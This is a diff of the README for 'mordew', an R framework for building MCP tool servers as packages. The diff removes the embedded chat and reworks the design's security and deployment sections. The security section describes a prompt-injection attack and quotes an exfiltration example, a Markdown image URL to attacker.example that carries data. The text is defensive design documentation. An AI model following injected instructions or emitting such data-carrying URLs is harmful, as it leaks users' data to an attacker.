@@ -16,9 +16,10 @@ mordew does for MCP servers what golem does for Shiny apps: **an MCP server
 is an R package**. Each tool is an exported R function, documented with
 roxygen and tested with testthat. mordew scaffolds the package, turns the
 roxygen documentation into an MCP tool registry, serves that registry to
-any MCP client (Claude Desktop, Claude Code, Copilot…), ships an embedded
-chat that can only use those tools, and provides the testing, security and
-deployment conventions needed to run all this in production.
+any MCP client (Claude Code, Claude Desktop, Codex, Copilot…), and provides
+the testing, security and deployment conventions needed to run all this in
+production. mordew does not ship a chat: a chat is a separate product,
+which talks to a mordew server through MCP like any other client.
 
 Throughout this README, the examples use `runlog`, a toy package that
 answers questions about a (fake) running log: distances, elevation gain,
@@ -35,10 +36,8 @@ mordew::add_tool(
   name = "summarise_runs"
 )
 
-# run the MCP server and open the embedded chat
-runlog::run(
-  chat = TRUE
-)
+# run the MCP server (stdio by default)
+runlog::run_mcp_server()
 ```
 
 ---
@@ -86,17 +85,37 @@ mordew **is**:
 - scaffolding: `create_mcp()`, `add_tool()`, `dev/` scripts
 - a roxygen roclet that turns documentation into a tool registry
 - a testing toolkit covering three levels: unit, contract, behaviour
-- runtime helpers: MCP server, embedded chat, audit log, limits
+- runtime helpers: MCP server, asynchronous execution, audit log, limits
 - deployment helpers: Docker, Kubernetes, Posit Connect
 
 mordew **is not**:
 
 - a new implementation of the MCP protocol: that is delegated to
   [mcptools](https://posit-dev.github.io/mcptools/)
-- a new LLM client: that is delegated to [ellmer](https://ellmer.tidyverse.org/)
-- a new chat UI: that is delegated to
-  [shinychat](https://posit-dev.github.io/shinychat/r/)
+- an LLM client: mordew never calls a model itself, except in behavioural
+  evals, which rely on [ellmer](https://ellmer.tidyverse.org/) and vitals
+- a chat: a chat is a separate product, an MCP client like any other
+  (see [Scope: the chat is a separate product](#scope-the-chat-is-a-separate-product))
 - a sandbox: OS-level isolation is documented and scaffolded, not reinvented
+
+### Scope: the chat is a separate product
+
+A chat that talks MCP does not depend on the server it connects to: it
+works with any MCP server, written in R or not. Its concerns are those of
+another product (user authentication, conversation history, choice of
+model, safe rendering, scaling Shiny sessions), and its dependencies
+(shiny, shinychat, ellmer) would weigh on every package built with
+mordew. So mordew stops at the MCP server.
+
+- **To try tools during development**: call them from the R console with
+  `call_tool()`, connect an MCP inspector, or open a [Claude Code session
+  restricted to the server](#a-claude-code-session-restricted-to-the-server).
+- **To give users a chat**: build it as its own application, for example
+  a golem app using shinychat and ellmer, that connects to the mordew
+  server through MCP. Everything the server enforces (validation, limits,
+  asynchronous execution, audit log) then applies to the chat too. The
+  section [Clients we build ourselves](#clients-we-build-ourselves) lists
+  what such a chat must get right.
 
 ---
 
@@ -109,7 +128,7 @@ mordew **is not**:
 | [mcpr](https://chi2labs.github.io/mcpr/index.html) (chi2labs) | Decorator-based MCP server, following plumber's patterns. | No package structure. |
 | [plumber2mcp](https://cdn.jsdelivr.net/gh/armish/plumber2mcp@main/README.md) | Turns a plumber API into an MCP server. | Starts from an API, not from a domain package. |
 | [mcplite](https://stat.ethz.ch/CRAN/web/packages/mcplite/mcplite.pdf) | Lightweight stdio MCP server, with OpenTelemetry spans. | stdio only, no production framework. |
-| [shinychat](https://opensource.posit.co/blog/2025-11-20_shinychat-tool-ui/) + ellmer (Posit) | Shiny chat UI wired to a model, with tool-call display. | UI only. |
+| [shinychat](https://opensource.posit.co/blog/2025-11-20_shinychat-tool-ui/) + ellmer (Posit) | Shiny chat UI wired to a model, with tool-call display. | A building block for a separate chat product, outside mordew's scope. |
 | [btw](https://posit-dev.github.io/btw/) (Posit) | Ready-made tools that give models context about R sessions and packages. | Aimed at coding assistants, not at domain tools. |
 | [FastMCP](https://gofastmcp.com/docs) (Python) | The reference framework in Python: schema, validation, authentication, deployment. | No R equivalent. |
 
@@ -140,7 +159,7 @@ them.
 | **Production without Posit Connect**: Dockerfile, Kubernetes, auth, multi-user, asynchronous execution | Production R often runs in containers, outside Posit Connect, and must serve several users at once. | No, it has to be done by hand |
 | **Audit log** of every tool call | Traceability is required in regulated environments. | No |
 | **Return conventions**: data frame → table, plot → image, errors the model can act on | Keeps the model's context small and answers usable. | No |
-| **Closed embedded chat** | The model only sees the package's tools, with no other connectors around. | Partly (shinychat) |
+| **Restricted client configurations** (`mcp_client_config()`) | Generates the most restricted setup each client allows, and says when it is only partial. | No |
 
 ---
 
@@ -155,16 +174,14 @@ flowchart LR
   end
   pkg -- "roclet" --> REG["Tool registry<br/>ellmer::tool() objects"]
   REG --> SRV["MCP server<br/>mcptools, stdio or HTTP"]
-  SRV --> EXT["External MCP clients<br/>Claude Desktop, Claude Code, Copilot"]
-  SRV --> CHAT["Embedded chat<br/>shinychat + ellmer"]
+  SRV --> EXT["MCP clients<br/>Claude Code, Claude Desktop, Codex, Copilot"]
+  SRV --> CHAT["A separate chat app<br/>an MCP client, outside mordew"]
   SRV --> LOG[("Audit log")]
 ```
 
 The **tool registry** is the centre of the design. It is generated once
-from roxygen and served through a single MCP server, both to external
-clients and to the embedded chat. `run()` starts the server in the
-background, then opens the chat, which connects to it like any other MCP
-client.
+from roxygen and served through a single MCP server to every client. A
+chat application is one of those clients, built and deployed separately.
 
 ### Anatomy of a mordew package
 
@@ -176,12 +193,11 @@ runlog/
 │   └── runs.rda                 # fake running log used by the tools
 ├── R/
 │   ├── tool_summarise_runs.R    # one file per tool
-│   ├── run.R                    # run(), run_mcp_server(), run_chat()
+│   ├── run.R                    # run_mcp_server()
 │   └── mordew_registry.R        # generated by the roclet, do not edit
 ├── inst/
 │   └── mordew/
-│       ├── config.yml           # model, transport, limits, audit log
-│       └── system_prompt.md     # prompt for the embedded chat
+│       └── config.yml           # transport, port, workers, limits, audit log
 ├── tests/
 │   └── testthat/
 │       ├── test-tool_summarise_runs.R
@@ -252,9 +268,9 @@ mordew will ship a guide on writing them.
 
 ### Runtime and process model
 
-- **One function, two processes.** `mcptools::mcp_server()` blocks the R
-  process that calls it, so `run()` starts the server in the background
-  (callr, processx or mirai) and runs the chat in the foreground.
+- **The server owns its process.** `mcptools::mcp_server()` blocks the R
+  process that calls it, so `run_mcp_server()` is meant to be the main
+  loop of a dedicated process, never something run inside another app.
 - **Transports.** With stdio, each desktop client spawns its own R
   process: one user, no auth. With HTTP, one shared server serves many
   users, so it needs authentication and a concurrency strategy.
@@ -267,11 +283,9 @@ mordew will ship a guide on writing them.
   answer any call. When a multi-step analysis (load, filter, model) needs
   state, it lives outside the R process (database, Redis, files), behind
   handles (`"dataset_1"`) with a time-to-live, isolated per session.
-- **Multi-user chat.** `shinychat::chat_app()` is meant for a single user.
-  The embedded chat must use `chat_ui()` and `chat_server()`, with one
-  ellmer client per Shiny session.
-- **Configuration.** golem-style `inst/mordew/config.yml`: model provider
-  and name, transport, port, limits, audit log location, system prompt.
+- **Configuration.** golem-style `inst/mordew/config.yml`: transport,
+  port, worker pool, limits, audit log location. The model and the
+  system prompt belong to the client, not to the server.
 - **Observability.** OpenTelemetry tracing of each tool call, building on
   the instrumentation already present in ellmer and mcplite.
 
@@ -476,9 +490,10 @@ Planned helpers: `expect_tool_schema()`, `call_tool()`,
    MCP server" is a preference the model usually follows, not a guarantee.
    Only the tools actually available to it are enforced. In a default
    Claude Desktop or Claude Code setup, a mordew server sits next to
-   other connectors and built-in tools that we do not control. Two setups
-   control the full tool list: the embedded chat, and a [Claude Code
-   session restricted to the
+   other connectors and built-in tools that we do not control. Only two
+   setups control the full tool list: a client we build ourselves (see
+   [Clients we build ourselves](#clients-we-build-ourselves)), and a
+   [Claude Code session restricted to the
    server](#a-claude-code-session-restricted-to-the-server).
 
 [Posit warns](https://tidyverse.org/blog/2025/07/mcptools-0-1-0/) that
@@ -495,19 +510,22 @@ kept away.
 | Malformed or hostile arguments | Validation generated from the schema, before the function runs. |
 | R can still reach the system | OS-level isolation in production: non-root container, read-only file system, restricted network egress. On Linux, per-call sandboxing with `unix::eval_safe()` or [RAppArmor](https://cran.r-project.org/web/packages/RAppArmor/index.html). |
 | Runaway calls | Per-call timeouts and resource limits. |
-| Data leakage to the model provider | Aggregated outputs by default, `max_rows`, a redaction hook, and the option of a self-hosted model through ellmer's providers. |
+| Data leakage to the model provider | Aggregated outputs by default, `max_rows`, a redaction hook, and, on the client side, the option of a self-hosted model. |
 | Unauthorised access to an HTTP server | Authentication following the MCP authorization specification (OAuth 2.1), or a reverse proxy in front of the server. |
 | No traceability | Audit log of every call (below). |
 | Secrets exposed to the model | Secrets come from environment variables or config, never from tool arguments or results. |
-| Exfiltration through the chat UI | The embedded chat does not load remote images or other remote content from model output (see below). |
 
-### Why the embedded chat is different, and where it can still leak
+### Clients we build ourselves
+
+A chat is outside mordew's scope, but whoever builds one on top of a
+mordew server needs to know why it differs from third-party clients, and
+where it can still leak.
 
 In Claude Code or Codex, we configure someone else's product, which ships
 its own tools and reads other configuration sources: we can only remove
-what its vendor lets us remove. In the embedded chat, **mordew is the
-client**. Our R code (ellmer) calls the model API and sets the tool list
-sent with every request:
+what its vendor lets us remove. In a chat we build, **we are the
+client**. Our code (for example ellmer) calls the model API and sets the
+tool list sent with every request:
 
 - A model called through an API has no tools by default: no shell, no
   files. It can only request the tools declared in the request, here the
@@ -515,7 +533,7 @@ sent with every request:
 - Tools run in the client's code. A tool the model invents has no
   function behind it.
 - Tools hosted by the model provider (web search, code execution) are
-  only enabled if the request asks for them, and mordew does not.
+  only enabled if the request asks for them.
 - Users cannot add connectors or MCP servers, and the system prompt is
   ours.
 
@@ -527,8 +545,8 @@ Three risks remain:
 3. **The chat UI itself can leak data.** If it renders Markdown images, an
    injected instruction can make the model write an image whose URL
    carries data (`![](https://attacker.example/?d=...)`), and the browser
-   sends it when loading the image. The embedded chat must not load
-   remote images or other remote resources from model output: render
+   sends it when loading the image. Such a chat must not load remote
+   images or other remote resources from model output: render
    images as plain links or drop them, and set a Content Security Policy
    that only allows the app's own origin.
 
@@ -536,8 +554,8 @@ Three risks remain:
 
 One JSON line per tool call, append-only: timestamp, session ID, user
 (when authenticated), client, tool, arguments, result size and hash,
-duration, status, and the model (in the embedded chat). Storing full
-results is optional because it is a privacy trade-off.
+duration and status. Storing full results is optional because it is a
+privacy trade-off.
 
 ---
 
@@ -549,7 +567,6 @@ results is optional because it is a privacy trade-off.
 | Docker | HTTP | `add_dockerfile()`, built on [dockerfiler](https://github.com/ThinkR-open/dockerfiler) as in golem |
 | Kubernetes | HTTP | example manifests: probes, replicas, secrets |
 | Posit Connect | HTTP | mcptools' `_server.yml` with `engine: mcptools`, through `add_connect()` |
-| Embedded chat | Shiny | deployed like any golem app |
 
 ### When a single process is enough
 
@@ -608,7 +625,7 @@ deployments.
 - Cancellation: when a client gives up, the call stops, if the
   specification revision in use allows it.
 - Progress feedback for long calls, if the specification revision in use
-  allows it, so that users are not left in front of a frozen chat.
+  allows it, so that users are not left in front of a frozen client.
 - Every call stays in the audit log with its queue time, run time and
   status.
 
@@ -678,7 +695,6 @@ CMD ["Rscript", "-e", "runlog::run_mcp_server(transport = 'http', host = '0.0.0.
 | --- | --- | --- | --- |
 | MCP server, replica | HTTP | `run_mcp_server(transport = "http", host = "0.0.0.0")` | architecture A, behind a load balancer |
 | MCP server, worker pool | HTTP | `run_mcp_server(transport = "http", host = "0.0.0.0", workers = 4)` | architecture B, one container |
-| Embedded chat | Shiny | `run_chat(host = "0.0.0.0")` | users in a browser, deployed like a golem app |
 | stdio | stdio | `run_mcp_server()` | desktop clients, through `docker run -i --rm` |
 
 **stdio in Docker.** An MCP client can start a container instead of a
@@ -696,8 +712,8 @@ have R installed:
 }
 ```
 
-**docker-compose.** A generated `docker-compose.yml` runs the MCP server,
-the embedded chat and a reverse proxy together, to test the whole
+**docker-compose.** A generated `docker-compose.yml` runs the MCP server
+(replicas or worker pool) and a reverse proxy together, to test the whole
 architecture locally before deploying it.
 
 ### Container checklist
@@ -727,8 +743,9 @@ architecture locally before deploying it.
 
 - Same philosophy: a package, `dev/` scripts, conventions over configuration.
 - Same tooling where possible: dockerfiler, attachment, config.
-- Possible bridges, to explore: a golem app embedding a mordew chat, or a
-  `golem::add_mcp()` exposing an app's business logic as an MCP server.
+- Possible bridges, to explore: a chat built as a golem app that connects
+  to mordew servers through MCP, or a `golem::add_mcp()` exposing an app's
+  business logic as an MCP server.
 
 ---
 
@@ -749,7 +766,7 @@ Shiny projects.
 
 ### Phase 1: prototype without the framework
 
-- [ ] Build one real-world MCP server by hand with mcptools, ellmer and shinychat
+- [ ] Build one real-world MCP server by hand with mcptools, used from existing MCP clients
 - [ ] Write down every repetition and every point of friction
 - [ ] Measure tool-call accuracy, latency and token usage
 - [ ] Collect security and compliance requirements from regulated users
@@ -757,7 +774,7 @@ Shiny projects.
 ### Phase 2: core framework (MVP)
 
 - [ ] Set up the mordew package: DESCRIPTION, testthat 3rd edition, lintr, GitHub Actions `R-CMD-check`, pkgdown
-- [ ] `create_mcp()`: package template, `dev/` scripts, `inst/mordew/config.yml`, system prompt
+- [ ] `create_mcp()`: package template, `dev/` scripts, `inst/mordew/config.yml`
 - [ ] `add_tool()`: tool file and test file from templates
 - [ ] Specify the roxygen tags (`@mcp_tool`, `@mcp_type`, `@mcp_returns`, annotations, limits)
 - [ ] Write the roclet that generates `R/mordew_registry.R`
@@ -765,9 +782,7 @@ Shiny projects.
 - [ ] Return-value serialisation (text, table, image, JSON, errors)
 - [ ] `run_mcp_server()` for stdio and HTTP, on top of mcptools
 - [ ] Spike: asynchronous HTTP front (handler returning a promise, tools in mirai workers) to validate architecture B early
-- [ ] `run_chat()`: multi-user shinychat app connected to the server
-- [ ] Chat UI hardening: no remote images or resources from model output, Content Security Policy
-- [ ] `run()`: server in the background, then the chat
+- [ ] Development loop: document how to try tools with `call_tool()`, an MCP inspector and a restricted Claude Code session
 - [ ] `mcp_client_config()` for Claude Desktop, Claude Code, Codex CLI, Gemini CLI and VS Code: the most restricted configuration each client allows, with a warning when the restriction is partial
 - [ ] Re-check client restriction options before each release: they change quickly
 
@@ -792,8 +807,8 @@ Shiny projects.
 - [ ] Deployment guide for replicas behind a load balancer (architecture A), with nginx and Kubernetes examples
 - [ ] Load tests: concurrent users, slow tools, timeouts, queue saturation
 - [ ] Check that tools keep no in-memory state (a contract test)
-- [ ] `add_dockerfile()` with dockerfiler: HTTP replica, worker pool, embedded chat and stdio variants
-- [ ] Generated `docker-compose.yml`: MCP server, embedded chat and reverse proxy
+- [ ] `add_dockerfile()` with dockerfiler: HTTP replica, worker pool and stdio variants
+- [ ] Generated `docker-compose.yml`: MCP server and reverse proxy
 - [ ] Container defaults: `0.0.0.0` binding, non-root user, health check, configuration through environment variables
 - [ ] Authentication for the HTTP transport
 - [ ] Audit log, with queue time and run time
@@ -822,9 +837,9 @@ Shiny projects.
 2. **Explicit type tags or inference?** Tags are explicit but verbose.
    Types could also be inferred from defaults or from assertions
    (checkmate, rlang).
-3. **Should the embedded chat go through MCP or call tools directly?**
-   Going through MCP exercises the production path; calling directly is
-   faster and simpler.
+3. ~~**Should the embedded chat go through MCP or call tools
+   directly?**~~ Decided: mordew ships no chat. A chat is a separate
+   product and talks to a mordew server through MCP, like any client.
 4. **Which protocol layer?** mcptools (maintained by Posit, HTTP, Connect)
    or mcplite (lightweight, OpenTelemetry).
 5. **State model**: stateless only, or handles with a session object store.
